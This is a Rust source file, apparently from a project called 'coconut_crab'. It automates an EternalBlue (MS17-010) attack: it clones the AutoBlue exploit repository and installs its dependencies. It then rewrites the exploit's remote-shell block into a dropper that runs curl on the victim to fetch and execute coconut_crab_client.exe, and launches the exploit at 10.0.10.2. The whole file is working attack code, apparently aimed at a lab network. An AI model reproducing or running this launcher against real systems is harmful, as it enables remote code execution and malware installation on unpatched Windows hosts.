use std::process::Command;
use std::{ env, fs };
use regex::Regex;
use log::{ debug, error, info };
use coconut_crab_lib::file::get_exe_path_dir;

const GIT_REPO_URL: &str = "https://github.com/3ndG4me/AutoBlue-MS17-010";
const COCONUT_CRAB_SERVER_URL: &str = "https://127.0.0.1:3000/download/coconut_crab_client.exe";
const GROUPS: [u8; 1] = [10];

fn main() {
    env_logger::Builder::new().filter_level(log::LevelFilter::Debug).init();

    let exe_dir = get_exe_path_dir();
    debug!("Entering EXE directory: {:?}", exe_dir);
    env::set_current_dir(&exe_dir).unwrap();

    debug!("Cloning Git repository");
    let output = Command::new("git")
        .args(["clone", GIT_REPO_URL])
        .output()
        .expect("Failed to clone Git repository");
    if !output.stdout.is_empty() {
        debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
    }
    if !output.stderr.is_empty() {
        error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr));
    }

    let mut repo_dir = exe_dir.clone();
    repo_dir.push("AutoBlue-MS17-010");
    debug!("Entering Git repository: {:?}", repo_dir);
    env::set_current_dir(&repo_dir).expect("Unable to enter Git repository");

    debug!("Creating virtual environment");
    let output = Command::new("python")
        .args(["-m", "venv", "blue-env"])
        .output()
        .expect("Failed to create virtual environment");
    if !output.stdout.is_empty() {
        debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
    }
    if !output.stderr.is_empty() {
        error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr));
    }

    let python_path = if cfg!(windows) {
        "blue-env/Scripts/python.exe"
    } else {
        "blue-env/bin/python"
    };
    debug!("Virtual environment python path: {}", python_path);

    let pip_path = if cfg!(windows) { "blue-env/Scripts/pip.exe" } else { "blue-env/bin/pip" };
    debug!("Virtual environment pip path: {}", pip_path);

    debug!("Updating pip");
    let output = Command::new(python_path)
        .args(["-m", "pip", "install", "--upgrade", "pip"])
        .output()
        .expect("Failed to install dependencies");
    if !output.stdout.is_empty() {
        debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
    }
    if !output.stderr.is_empty() {
        error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr));
    }

    debug!("Installing dependencies");
    let output = Command::new(pip_path)
        .args(["install", "-r", "requirements.txt"])
        .output()
        .expect("Failed to install dependencies");
    if !output.stdout.is_empty() {
        debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
    }
    if !output.stderr.is_empty() {
        error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr));
    }

    let remote_shell_regex = Regex::new(
        r" +# example of creating a remote shell on the remote host(?:[\r\n]+[^\r\n]+){9}"
    ).expect("Invalid regex");
    let dropper_text =
        format!("    smbConn = conn.get_smbconnection()\n    service_exec(smbConn, r'curl {} -o coconut_crab_client.exe; .\\coconut_crab_client.exe')", COCONUT_CRAB_SERVER_URL);
    let content = fs::read_to_string("zzz_exploit.py").expect("Failed to read exploit code");
    let content_replaced = remote_shell_regex.replace_all(&content, dropper_text);
    fs::write("zzz_exploit.py", content_replaced.as_bytes()).expect(
        "Failed to write exploit code to file"
    );

    for group in GROUPS {
        let ip_address = format!("10.0.{}.2", group);

        debug!("Executing exploit");
        // let output = Command::new(python_path).args(&["zzz_exploit.py", &ip_address]).output().expect("Failed to execute exploit");
        let output = Command::new(python_path)
            .args(["zzz_exploit.py", &ip_address])
            .output()
            .expect("Failed to execute exploit");
        if !output.stdout.is_empty() {
            info!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr));
        }
    }
}
